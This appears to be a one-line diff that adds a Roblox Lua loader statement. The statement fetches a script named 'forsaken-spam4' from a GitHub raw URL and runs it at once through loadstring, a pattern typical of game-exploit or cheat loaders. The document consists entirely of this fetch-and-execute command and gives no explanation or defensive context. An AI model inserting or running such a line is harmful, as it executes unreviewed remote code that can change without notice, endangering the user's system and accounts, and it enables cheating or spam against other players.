@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/forsaken-spam4-kvr7lmprmdld9t.lua"))()
